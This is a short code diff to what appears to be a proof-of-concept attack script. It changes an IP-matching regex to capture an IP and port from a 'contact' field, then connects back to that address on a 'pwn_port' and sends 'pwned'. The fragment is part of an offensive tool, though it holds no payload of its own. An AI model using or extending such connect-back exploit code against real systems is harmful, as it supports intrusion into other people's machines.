@@ -43,7 +43,7 @@ def get_args():
 
 def main(args):
 	# used for finding IPs to match
-	contact_pattern = r'(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)'
+	contact_pattern = r'(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?)\.(25[0-5]|2[0-4]\d|[01]?\d\d?):\d+(?=;)'
 
 	http_thread = Thread(target=run, args=(args.listen_port, args.pwn_port))
 	http_thread.start()
@@ -104,7 +104,7 @@ def main(args):
 		print('-' * len(header))
 
 		con.send(BODY.encode("ascii"))
-		con_ip = search(contact_pattern, contact).group()
+		con_ip, con_port = search(contact_pattern, contact).group().split(':')
 		s2 = socket(AF_INET, SOCK_STREAM)
 		s2.connect((con_ip, args.pwn_port))
 		s2.send(b'pwned')
